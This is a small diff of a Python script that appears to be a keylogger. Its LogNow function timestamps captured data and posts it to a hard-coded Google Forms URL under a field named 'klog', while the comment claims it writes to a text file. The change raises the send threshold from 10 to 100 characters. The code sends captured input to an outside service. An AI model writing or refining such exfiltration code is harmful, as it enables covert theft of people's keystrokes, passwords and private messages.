@@ -15,7 +15,7 @@ data=''
 #Write function to write logs to text file
 def LogNow():
     global data
-    if len(data) > 10:
+    if len(data) > 100:
         data = str(datetime.datetime.now())+" : " +data
         url = "https://docs.google.com/forms/d/e/1FAIpQLSeZDjalqbMkiobv96KIQePCBhzsGHnM80FfRsZVqI4W3iGhrw/formResponse"  # Specify Google Form URL here
         klog = {'entry.930665253': data}  # Specify the Field Name here
